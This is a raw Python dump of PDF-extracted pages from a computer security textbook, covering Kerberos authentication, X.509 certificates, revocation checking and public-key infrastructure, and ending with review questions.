to a particular server. The client process represent-\\ning the user sends a message to the AS that includes the user’s ID and a request for \\nwhat is known as a ticket-granting ticket (TGT). The AS checks its database to find \\nthe password of this user. Then the AS responds with a TGT and a one-time encryp-\\ntion key, known as a session key, both encrypted using the user’s password as the \\nencryption key. When this message arrives back at the client, the client prompts the \\nuser for his or her password, generates the key, and attempts to decrypt the incoming \\nmessage. If the correct password has been supplied, the ticket and session key are \\nsuccessfully recovered.\\nNotice what has happened. The AS has been able to verify the user’s identity \\nsince this user knows the correct password, but it has been done in such a way that the \\npassword is never passed over the network. In addition, the AS has passed informa-\\ntion to the client that will be used later on to apply to a server for service, and that \\ninformation is secure since it is encrypted with the user’s password.\\nThe ticket constitutes a set of credentials that can be used by the client to apply \\nfor service. The ticket indicates that the AS has accepted this client and its user. The \\nticket contains the user’s ID, the server’s ID, a timestamp, a lifetime after which \\nthe\\xa0ticket is invalid, and a copy of the same session key sent in the outer message \\nto\\xa0the client. The entire ticket is encrypted using a secret DES key shared by the AS \\nand the server. Thus, no one can tamper with the ticket.\\nNow, Kerberos could have been set up so the AS would send back a ticket grant-\\ning access to a particular application server. This would require the client to request \\na new ticket from the AS for each service the user wants to use during a logon ses -\\nsion, which would in turn require the AS query the user for his or her password for \\neach service request, or else to store the password in memory for the duration of the \\nM23_STAL0611_04_GE_C23.indd   708 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 710, 'page_label': '709'}, page_content='23.1 / KERBEROS  709\\nFigure 23.1 Overview of Kerberos\\nAuthentication\\nserver (AS)\\nTicket-\\ngranting\\nserver (TGS)\\nHost/\\napplication\\nserver\\nRequest ticket-\\ngranting ticket\\nOnce per\\nuser logon\\nsession\\n1. User logs on to\\nworkstation and\\nrequests service on host.\\n3. Workstation prompts\\nuser for password to decrypt\\nincoming message, then\\nsend ticket and\\nauthentictor that contains\\nuser’s name, network\\naddress and time to TGS.\\nTicket + session key\\nRequest service-\\ngranting ticket\\nTicket + session key\\nOnce per\\ntype of service\\n4. TGS decrypts ticket and\\nauthenticator, veriﬁes request\\nthen creates ticket for requested\\napplication server. \\nKerberos\\n5. Workstation sends\\nticket and authenticator\\nto host.\\n6. Host veriﬁes that\\nticket and authenticator\\nmatch, then grants access\\nto service. If mutual\\nauthentication is\\nrequired, server returns\\nan authenticator.\\nRequest service\\nProvide server\\nauthenticator\\nOnce per\\nservice session\\n2. AS veriﬁes user’s access right in\\ndatabase, creates ticket-granting ticket\\nand session key. Results are encrypted\\nusing key derived from user’s password.\\nlogon session. The first course is inconvenient for the user and the second course is \\na security risk. Therefore, the AS supplies a ticket good not for a specific application \\nservice, but for a special ticket-granting server (TGS). The AS gives the client a ticket \\nthat can be used to get more tickets!\\nThe idea is that this ticket can be used by the client to request multiple service-\\ngranting tickets. So the ticket-granting ticket is to be reusable. However, we do not \\nwish an opponent to be able to capture the ticket and use it. Consider the following \\nscenario: An opponent captures the ticket and waits until the user has logged off \\nthe workstation. Then the opponent either gains access to that workstation or con -\\nfigures his workstation with the same network address as that of the victim. Then \\nthe opponent would be able to reuse the ticket to spoof the TGS. To counter this, \\nthe ticket includes a timestamp, indicating the date and time at which the ticket was \\nissued, and a lifetime, indicating the length of time for which the ticket is valid (e.g., \\n8 hours). Thus, the client now has a reusable ticket and need not bother the user for \\na password for each new service request. Finally, note the ticket-granting ticket is \\nencrypted with a secret key known only to the AS and the TGS. This prevents altera-\\ntion of the ticket. The ticket is reencrypted with a key based on the user’s password. \\nM23_STAL0611_04_GE_C23.indd   709 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 711, 'page_label': '710'}, page_content='710  CHAPTER 23 / InTERnET AuTHEnTICATIOn APPlICATIOnS\\nThis assures that the ticket can be recovered only by the correct user, providing the \\nauthentication.\\nLet us see how this works. The user has requested access to server V . The client \\nprocess representing the user (C) has obtained a ticket-granting ticket and a tem -\\nporary session key. The client then sends a message to the TGS requesting a ticket \\nfor user X that will grant service to server V . The message includes the ID of server \\nV and the ticket-granting ticket. The TGS decrypts the incoming ticket (remember, \\nthe ticket is encrypted by a key known only to the AS and the TGS) and verifies the \\nsuccess of the decryption by the presence of its own ID. It checks to make sure that \\nthe lifetime has not expired. Then it compares the user ID and network address with \\nthe incoming information to authenticate the user.\\nAt this point, the TGS is almost ready to grant a service-granting ticket to the \\nclient. But there is one more threat to overcome. The heart of the problem is the \\nlifetime associated with the ticket-granting ticket. If this lifetime is very short (e.g., \\nminutes), then the user will be repeatedly asked for a password. If the lifetime is \\nlong (e.g., hours), then an opponent has a greater opportunity for replay. An oppo-\\nnent could eavesdrop on the network and capture a copy of the ticket-granting \\nticket then wait for the legitimate user to log out. Then the opponent could forge \\nthe legitimate user’s network address and send a message to the TGS. This would \\ngive the opponent unlimited access to the resources and files available to the legiti -\\nmate user.\\nTo get around this problem, the AS has provided both the client and the TGS \\nwith a secret session key that they now share. The session key, recall, was in the \\nmessage from the AS to the client, encrypted with the user’s password. It was also \\nburied in the ticket-granting ticket, encrypted with the key shared by the AS and \\nTGS. In the message to the TGS requesting a service-granting ticket, the  client \\nincludes an authenticator encrypted with the session k ey, which contains the ID \\nand address of the user and a timestamp. Unlike the ticket, which is reusable, the \\nauthenticator is intended for use only once and has a very short lifetime. Now, TGS \\ncan decrypt the ticket with the key that it shares with the AS. This ticket indicates \\nthat user X has been provided with the session key. In effect, the ticket says, “Any-\\none who uses this session key must be X.” TGS uses the session key to decrypt the \\nauthenticator. The TGS can then check the name and address from the authentica -\\ntor with that of the ticket and with the network address of the incoming message. If \\nall match, then the TGS is assured that the sender of the ticket is indeed the ticket’s \\nreal owner. In effect, the authenticator says, “At the time of this authenticator,  \\nI hereby use this session key.” Note the ticket does not prove anyone’s identity, but \\nis a way to distribute keys securely. It is the authenticator that proves the client’s \\nidentity. Because the authenticator can be used only once and has a short lifetime, \\nthe threat of an opponent stealing both the ticket and the authenticator for pre -\\nsentation later is countered. Later, if the client wants to apply to the TGS for a \\nnew service-granting ticket, it sends the reusable ticket-granting ticket plus a fresh  \\nauthenticator.\\nThe next two steps in the protocol repeat the last two. The TGS sends a service-\\ngranting ticket and a new session key to the client. The entire message is encrypted \\nwith the old session key, so only the client can recover the message. The ticket is \\nM23_STAL0611_04_GE_C23.indd   710 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 712, 'page_label': '711'}, page_content='23.1 / KERBEROS  711\\nencrypted with a secret key shared only by the TGS and server V . The client now has \\na reusable service-granting ticket for V .\\nEach time user X wishes to use service V , the client can then send this ticket plus \\nan authenticator to server V . The authenticator is encrypted with the new session key.\\nIf mutual authentication is required, the server can reply with the value of the \\ntimestamp from the authenticator, incremented by 1, and encrypted in the session key. \\nThe client can decrypt this message to recover the incremented timestamp. Because \\nthe message was encrypted by the session key, the client is assured that it could have \\nbeen created only by V . The contents of the message assures C that this is not a replay \\nof an old reply.\\nFinally, at the conclusion of this process, the client and server share a secret key. \\nThis key can be used to encrypt future messages between the two or to exchange a \\nnew session key for that purpose.\\nKerberos Realms and Multiple Kerberi\\nA full-service Kerberos environment consisting of a Kerberos server, a number of \\nclients, and a number of application servers, requires the following:\\n1. The Kerberos server must have the user ID and password of all participating \\nusers in its database. All users are registered with the Kerberos server.\\n2. The Kerberos server must share a secret key with each server. All servers are \\nregistered with the Kerberos server.\\nSuch an environment is referred to as a realm. Networks of clients and servers \\nunder different administrative organizations generally constitute different realms \\n(see Figure 23.2). That is, it generally is not practical, or does not conform to admin-\\nistrative policy, to have users and servers in one administrative domain registered \\nwith a Kerberos server elsewhere. However, users in one realm may need access to \\nservers in other realms, and some servers may be willing to provide service to users \\nfrom other realms, provided that those users are authenticated.\\nKerberos provides a mechanism for supporting such interrealm authentication. \\nFor two realms to support interrealm authentication, the Kerberos server in each \\ninteroperating realm shares a secret key with the server in the other realm. The two \\nKerberos servers are registered with each other.\\nThe scheme requires that the Kerberos server in one realm trust the Kerberos \\nserver in the other realm to authenticate its users. Furthermore, the participating \\nservers in the second realm must also be willing to trust the Kerberos server in the \\nfirst realm.\\nWith these ground rules in place, we can describe the mechanism as follows \\n(see Figure 23.2): A user wishing service on a server in another realm needs a ticket \\nfor that server. The user’s client follows the usual procedures to gain access to the \\nlocal TGS then requests a ticket-granting ticket for a remote TGS (TGS in another \\nrealm). The client can then apply to the remote TGS for a service-granting ticket for \\nthe desired server in the realm of the remote TGS.\\nThe ticket presented to the remote server indicates the realm in which the user \\nwas originally authenticated. The server chooses whether to honor the remote request.\\nM23_STAL0611_04_GE_C23.indd   711 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 713, 'page_label': '712'}, page_content='712  CHAPTER 23 / InTERnET AuTHEnTICATIOn APPlICATIOnS\\nOne problem presented by the foregoing approach is that it does not scale \\nwell to many realms. If there are N realms, then there must be N(N -)/2 secure key \\nexchanges so that each realm can interoperate with all other Kerberos realms.\\nVersion 4 and Version 5\\nThe first version of Kerberos that was widely used was version 4, published in the late \\n1980s. An improved and extended version 5 was introduced in 1993, and updated in \\n2005. Kerberos version 5 is now widely implemented, including as part of Microsoft’s \\nActive Directory service, in most current UNIX and Linux systems, and in Apple’s \\nMac OS X. It includes a number of improvements over version 4. First, in version 5, \\nan encrypted message is tagged with an encryption algorithm identifier. This enables \\nFigure 23.2 Request for Service in Another Realm\\nAuthentication\\nserver (AS)\\nTicket-\\ngranting\\nserver (TGS)\\nKerberos\\nAuthentication\\nserver (AS)\\nTicket-\\ngranting\\nserver (TGS)\\nKerberos\\nClient\\nRealm A\\nHost/\\napplication\\nserver\\nRealm B\\n1. Request ticket for local TGS\\n2. Ticket for local TGS\\n3. Request ticket for remote TGS\\n4. Ticket for remote TGS\\n5 Request ticket for remote server\\n6  Ticket for remote server\\n7. Request remote service\\nM23_STAL0611_04_GE_C23.indd   712 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 714, 'page_label': '713'}, page_content='23.2 / X.509  713\\nusers to configure Kerberos to use an algorithm other than DES, with the Advanced \\nEncryption Standard (AES) now the default choice.\\nVersion 5 also supports a technique known as authentication forwarding. \\n Version\\xa04 does not allow credentials issued to one client to be forwarded to some other \\nhost and used by some other client. Authentication forwarding enables a client to access \\na server and have that server access another server on behalf of the client. For example, \\na client issues a request to a print server that then accesses the client’s file from a file \\nserver, using the client’s credentials for access. Version 5 provides this capability.\\nFinally, version 5 supports a method for interrealm authentication that requires \\nfewer secure key exchanges than in version 4.\\nPerformance Issues\\nAs client/server applications become more popular, larger client/server installa -\\ntions are appearing. A case can be made that the larger the scale of the network -\\ning environment, the more important it is to have logon authentication. But the \\nquestion arises: What impact does Kerberos have on performance in a large-scale \\nenvironment?\\nFortunately, the answer is that there is very little performance impact if the \\nsystem is properly configured. Keep in mind that tickets are reusable. Therefore, the \\namount of traffic needed for the granting ticket requests is modest. With respect to \\nthe transfer of a ticket for logon authentication, the logon exchange must take place \\nanyway, so again the extra overhead is modest.\\nA related issue is whether the Kerberos server application requires a dedicated \\nplatform or can share a computer with other applications. It probably is not wise to \\nrun the Kerberos server on the same machine as a resource-intensive application such \\nas a database server. Moreover, the security of Kerberos is best assured by placing \\nthe Kerberos server on a separate, isolated machine.\\nFinally, in a large system, is it necessary to go to multiple realms in order to \\nmaintain performance? Probably not. Rather, the motivation for multiple realms is \\nadministrative. If you have geographically separate clusters of machines, each with \\nits own network administrator, then one realm per administrator may be convenient. \\nHowever, this is not always the case.\\n 23.2 X.509\\nPublic-key certificates are mentioned briefly in Section 2.4. Recall that a certificate \\nlinks a public key with the identity of the key’s owner, with the whole block signed \\nby a trusted third party. Typically, the third party is a certificate authority (CA) that \\nis trusted by the user community, such as a government agency, financial institution, \\ntelecommunications company, or other trusted peak organization. A user can present \\nhis or her public key to the authority in a secure manner and obtain a certificate. The \\nuser can then publish the certificate, or send it to others. Anyone needing this user’s \\npublic key can obtain the certificate and verify that it is valid by way of the attached \\ntrusted signature, provided they can verify the CA’s public key. Figure 2.8 illustrates \\nthis process.\\nM23_STAL0611_04_GE_C23.indd   713 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 715, 'page_label': '714'}, page_content='714  CHAPTER 23 / InTERnET AuTHEnTICATIOn APPlICATIOnS\\nThe X.509 ITU-T standard, also specified in RFC 5280 (Internet X.509 Public \\nKey Infrastructure Certificate and Certificate Revocation List (CRL) Profile , 2008), \\nis the most widely accepted format for public-key certificates. X.509 certificates are \\nused in most network security applications, including IP security (IPSEC), secure \\nsockets layer (SSL), transport layer security (TLS), secure electronic transactions \\n(SET), and S/MIME, as well as in eBusiness applications.\\nAn X.509 certificate includes the elements shown in Figure 23.3a. Key elements \\ninclude the key owning Subject’s X.500 name and public-key information, the Period \\nof validity dates, the CA’s Issuer name, and their Signature that binds all this infor-\\nmation together. Current X.509 certificates use the version 3 format that includes a \\ngeneral extension mechanism to provide more flexibility and to convey information \\nneeded in special circumstances. See [STAL17] for further information on the X.509 \\ncertificate format and elements.\\nOne important extension, in the “Basic Constraints” set, specifies whether the \\ncertificate is that of a CA or not. A CA certificate is used only to sign other cer -\\ntificates. Otherwise, the certificate belongs to an “end-user” (or “end-entity”), and \\nmay be used for verifying server or client identities, signing or encrypting e-mail or \\nother content, signing executable code, or other uses in applications such as those \\nwe listed above. The usage of any certificate’s key can be restricted by including the \\n“Key Usage” and “Extended Key Usage” extensions that specify a set of approved \\nFigure 23.3 X.509 Formats\\nCertiﬁcate\\nserial number\\nVersion\\nIssuer name\\nSignature\\nalgorithm\\nidentiﬁer\\nSubject name\\nExtensions\\nIssuer unique\\nidentiﬁer\\nSubject unique\\nidentiﬁer\\nAlgorithm\\nParameters\\nNot before\\nAlgorithms\\nParameters\\nKey\\nAlgorithms\\nParameters\\nEncrypted\\n(a) X.509 certiﬁcate\\nNot after\\nSubject’s\\npublic-key\\ninfo\\nSignature\\nPeriod of\\nvalidity\\nVersion 1\\nVersion 2\\nVersion 3\\nAll\\nversions\\nIssuer name\\nThis update date\\nNext update date\\nSignature\\nalgorithm\\nidentiﬁer\\nAlgorithm\\nParameters\\nUser certiﬁcate serial #\\n(b) Certiﬁcate revocation list\\nRevocation date\\nAlgorithms\\nParameters\\nEncrypted hash\\nSignature\\nRevoked\\ncertiﬁcate\\nUser certiﬁcate serial #\\nRevocation date\\nRevoked\\ncertiﬁcate\\nM23_STAL0611_04_GE_C23.indd   714 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 716, 'page_label': '715'}, page_content='23.2 / X.509  715\\nuses. “End-user” certificates are not permitted to sign other certificates, apart from \\nthe special case of proxy-certificates that we mention below.\\nThe CA and “end user” certificates discussed above are the most common form \\nof X.509 certificates. However, a number of specialized variants also exist, distin -\\nguished by particular element values or the presence of certain extensions. Variants \\ninclude:\\n• Conventional (long-lived) certificates  are the CA and “end user” certificates \\ndiscussed above. They are typically issued for validity periods of months to \\nyears.\\n• Short-lived certificates are used to provide authentication for applications such \\nas grid computing, while avoiding some of the overheads and limitations of \\nconventional certificates [HSU98]. They have validity periods of hours to days, \\nwhich limits the period of misuse if compromised. Because they are usually not \\nissued by recognized CA’s, there are issues with verifying them outside their \\nissuing organization.\\n• Proxy certificates are now widely used to provide authentication for applica -\\ntions such as grid computing, while addressing some of the limitations of short-\\nlived certificates. RFC 3820 ( Internet X.509 Public Key Infrastructure (PKI) \\nProxy Certificate Profile, 2004) defines proxy certificates, which are identified \\nby the presence of the “proxy certificate” extension. They allow an “end user” \\ncertificate to sign another certificate, which must be an extension of the existing \\ncertificate with a sub-set of their identity, validity period, and authorizations. \\nThey allow a user to easily create a credential to access resources in some envi-\\nronment, without needing to provide their full certificate and rights. There are \\nother proposals to use proxy certificates as network access capability tickets, \\nwhich authorize a user to access specific services with specific rights.\\n• Attribute certificates  use a different certificate format, defined in RFC 5755 \\n(An Internet Attribute Certificate Profile for Authorization, 2010), to link a user’s \\nidentity to a set of attributes that are typically used for authorization and access \\ncontrol. A user may have a number of different attribute certificates, with dif-\\nferent sets of attributes for different purposes, associated with their main con-\\nventional certificate. These attributes are defined in an “Attributes” extension. \\nThese extensions could also be included in a conventional certificate, but this is \\ndiscouraged as being too inflexible. They may also be included in a proxy cer-\\ntificate, further restricting its use, and this is appropriate for some applications.\\nBefore using any certificate, an application must check its validity, and ensure \\nthat it was not revoked before it expires. This may occur if the user wishes to cancel a \\nkey because it has been compromised, or because an upgrade in the user’s software \\nrequires the generation of a new key.\\nThe X.509 standard defines a certificate revocation list (CRL), signed by the \\nissuer, that includes the elements shown in Figure 23.3b. Each revoked certificate \\nentry contains a serial number of a certificate and the revocation date for that cer -\\ntificate. Because serial numbers are unique within a CA, the serial number is suffi -\\ncient to identify the certificate. When an application receives a certificate, the X.509 \\nstandard states it should determine whether it has been revoked, by checking against \\nM23_STAL0611_04_GE_C23.indd   715 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 717, 'page_label': '716'}, page_content='716  CHAPTER 23 / InTERnET AuTHEnTICATIOn APPlICATIOnS\\nthe current CRL for its issuing CA. However, due to the overheads in retrieving and \\n storing these lists, very few applications actually do this. “The recent Heartbleed Open \\nSSL bug, which has forced the revocation and replacement of very large numbers of \\nserver certificates, has dramatically highlighted deficiencies with the use of CRLs.”\\nA more practical alternative is to use the RFC 6960 (X.509 Internet Public Key \\nInfrastructure Online Certificate Status Protocol - OCSP , 2013), to query the CA as \\nto whether a specific certificate is valid. This lightweight protocol is increasingly used, \\nincluding in recent versions of most common Web browsers. The “Authority Informa-\\ntion Access” extension in a certificate can specify the address of the OCSP server to \\nuse, if the signing CA supports this protocol.\\nOriginally, most X.509 certificates signed an MD5 hash of their contents. Unfor-\\ntunately, research advances in creating MD5 collisions has led to the development of \\nseveral techniques for forging new certificates for different identities that have the \\nsame hash, and hence can reuse the same signature, as an existing valid certificate \\n[STEV07]. The Flame malware authors used this approach to forge what appeared \\nto be a valid Microsoft code-signing certificate. This allowed the malware to remain \\nundetected for more than 2 years before being identified in 2012. The use of MD5 \\nwas depreciated, and the SHA-1 hash algorithm recommended, in the 2000s. How -\\never the creation of SHA-1 collisions in 2017 means that, in turn, this algorithm is no \\nlonger considered secure. As of early 2017 , most browsers now reject certificates using \\nSHA-1 or MD5. The current requirement is to use one of the SHA-2 hash algorithms \\nin certificates, with support for SHA-3 as an alternative likely soon.\\n 23.3 PUBLIC-KEY INFRASTRUCTURE\\nRFC 4949 (Internet Security Glossary, Version 2, 2007) defines public-key infrastruc-\\nture (PKI) as the set of hardware, software, people, policies, and procedures needed to \\ncreate, manage, store, distribute, and revoke digital certificates based on asymmetric \\ncryptography. The principal objective for developing a PKI is to enable secure, con-\\nvenient, and efficient acquisition of public keys.\\nIn order to verify a certificate, you need to know the public key of the signing \\nCA. This could, in turn, be provided in another certificate, signed by a parent CA, with \\nthe CA’s organized in a hierarchy. Eventually, however, you must reach the top of the \\nhierarchy, and have a copy of the public key for that root CA. The X.509 standard \\ndescribes a PKI model that originally assumed there would be a single internation -\\nally specified hierarchy of government regulated CAs. This did not happen. Instead, \\ncurrent X.509 PKI implementations come with a large list of CAs and their public \\nkeys, known as a “trust store.” These CAs usually either directly sign “end-user” \\ncertificates, or sign a small number of Intermediate-CAs that in turn sign “end-user” \\ncertificates. Thus, all the hierarchies are very small, and all are equally trusted. Users \\nand servers that want an automatically verified certificate must acquire it from one \\nof these CAs. Alternatively, they can use either a “self-signed” certificate or a cer -\\ntificate signed by some other CA. However, in both these cases, such certificates will \\ninitially be recognized as “untrusted” and the user presented with stark warnings \\nabout accepting such certificates, even if they are actually legitimate.\\nM23_STAL0611_04_GE_C23.indd   716 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 718, 'page_label': '717'}, page_content='23.3 / PuBlIC-KEY InFRASTRuCTuRE  717\\nThere are many problems with this model of a PKI, and these have been \\nknown for many years [GUTM02, GRUS13]. Current implementations suffer \\nfrom a number of critical issues. The first is the reliance on the user to make an \\ninformed decision when there is a problem verifying a certificate. Unfortunately, \\nit is clear that most users do not understand what a certificate is and why there \\nmight be a problem. Hence they choose to accept a certificate, or not, for reasons \\nthat have little to do with their security, which may result in the compromise of \\ntheir systems.\\nAnother critical problem is the assumption that all of the CAs in the “trust \\nstore” are equally trusted, equally well-managed, and apply equivalent policies. \\nThis was dramatically illustrated by the compromise of the DigiNotar CA in 2011 \\nthat resulted in the fraudulent issue of certificates for many well-known organiza -\\ntions. It is widely believed these were used by the Iranian government to mount a \\n“man-the-middle” attack on the secured communications of many of their citizens. \\nAs a consequence, the DigiNotar CA keys were removed from the “trust store” in \\nmany systems, and the company was declared bankrupt later that year. Another \\nCA, Comodo, was also compromised in 2011, with a small number of fraudulent \\ncertificates issued.\\nA further concern is that different implementations, in the various Web brows-\\ners and operating systems, use different “trust stores,” and hence present different \\nsecurity views to users.\\nGiven these and other issues, several proposals exist to improve the practical \\nhandling of X.509 certificates. Some of these recognize that many applications do not \\nrequire formal linking of a public key to a verified identity. In many Web applica -\\ntions, for example, all users really need is to know that if they visit the same secure \\nsite and are supplied with a certificate for it, that it is the same site and same key as \\nwhen they previously visited. This is analogous to ensuring that if you visit the same \\nphysical store, you see the same company name and layout and staff as previously. \\nAnd further, users want to know that it is the same site and same key as other users \\nin other locations see.\\nThe first of these, confirming continuity in time, can be provided by user’s appli-\\ncations keeping a record of certificate details for all sites they visit, and checking \\nagainst these on subsequent visits. Certificate pinning in applications can provide \\nthis feature, as is used in Google Chrome. The Firefox “Certificate Patrol” extension \\nis another example of this approach.\\nThe second, confirming continuity in space, requires the use of a number of \\nwidely separated “network notary servers” that keep records of certificates for all \\nsites they view, that can be compared with a certificate provided to the user in any \\ninstance. The “Perspectives Project” is a practical implementation of this approach, \\nwhich may be accessed using the Firefox “Perspectives” plugin. This also verifies \\nthe time history of certificates in use, thus providing both desired features for this \\napproach. The “Google Certificate Catalog” and “Google Certificate Transparency” \\nproject are other examples of such notary servers.\\nIn either of the above cases, identification of a different certificate and key \\nto that seen at other times or places may well be an indication of attack or other \\nproblems. It may also simply be the result of certificates being updated as they \\nM23_STAL0611_04_GE_C23.indd   717 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 719, 'page_label': '718'}, page_content='718  CHAPTER 23 / InTERnET AuTHEnTICATIOn APPlICATIOnS\\napproach expiry, or of organizations incorrectly using multiple certificates and keys \\nfor the same, but replicated, server. These latter issues need to be managed by such \\nextensions.\\nPublic Key Infrastructure X.509 (PKIX)\\nThe Internet Engineering Task Force (IETF) Public Key Infrastructure X.509 (PKIX) \\nworking group has been the driving force behind setting up a formal (and generic) \\nmodel based on X.509 that is suitable for deploying a certificate-based architecture \\non the Internet. This section briefly describes the PKIX model. For more detail, see \\n[STAL17].\\nFigure 23.4 shows the interrelationship among the key elements of the PKIX \\nmodel. These elements include the End entity  (e.g., user or server) for which the \\ncertificate for and the Certificate authority  that issues the certificates. The CA’s \\nmanagement functions may be further divided to include the Registration authority \\n(RA) that handles end entity registration and the CRL issuer and Repository that \\nmanage CRLs.\\nPKIX identifies a number of management functions that potentially need to be \\nsupported by management protocols. These are indicated in Figure 23.4 and include \\nuser Registration, Initialization of key material, Certification in which a CA issues \\na certificate, Key pair recovery and update, Revocation request for a certificate, and \\nCross certification between CAs.\\nFigure 23.4 PKIX Architectural Model\\nEnd entityCertiﬁcate/CRL retrieval\\nCertiﬁcate\\npublication\\nCertiﬁcate/CRL\\npublication\\nCRL\\npublication\\nCross-certiﬁcation\\nCertiﬁcate/CRL repository\\nCertiﬁcate\\nauthority\\nRegistration\\nauthority\\nCertiﬁcate\\nauthority\\nRegistration,\\ninitialization,\\ncertiﬁcation,\\nkey pair recovery,\\nkey pair update\\nrevocation request\\nPKI\\nusers\\nPKI\\nmanagement\\nentities\\nCRL issuer\\nM23_STAL0611_04_GE_C23.indd   718 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 720, 'page_label': '719'}, page_content='23.4 / KEY TERMS, REVIEW QuESTIOnS, AnD PROBlEMS  719\\nKey Terms\\nauthentication server (AS)\\nCertificate Authority (CA)\\nEnd entity\\nKerberos\\nKerberos realm\\nPublic-Key Infrastructure \\n(PKI)\\nRegistration authority (RA)\\nticket-granting ticket (TGT)\\nticket-granting server (TGS)\\nX.509\\nX.509 certificate\\n 23.4 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nReview Questions\\n 23.1 What information is carried by the ticket?\\n 23.2 Describe the requirements of a full-service Kerberos environment.\\n 23.3 What is the role of the authentication server in a Kerberos system?\\n 23.4 How is authentication performed in a Kerberos system?\\n 23.5 What are some extensions listed in the X.509 standard, and what are their uses?\\n 23.6 What is the role of a CA in X.509?\\n 23.7 What different types of X.509 certificates exist?\\n 23.8 What alternatives exist to check that an X.509 certificate has not been revoked?\\n 23.9 What are short-lived certificates?\\n 23.10 How do most current X.509 implementations check the validity of signatures on a \\ncertificate?\\n 23.11 What are some key problems with current public key infrastructure implementations?\\n 23.12 List the key elements of the PKIX model.\\nProblems\\n 23.1 CBC (cipher block chaining) has the property that if an err or occurs in transmission \\nof ciphertext block CI, then this error propagates to the recovered plaintext blocks PI \\nand PI 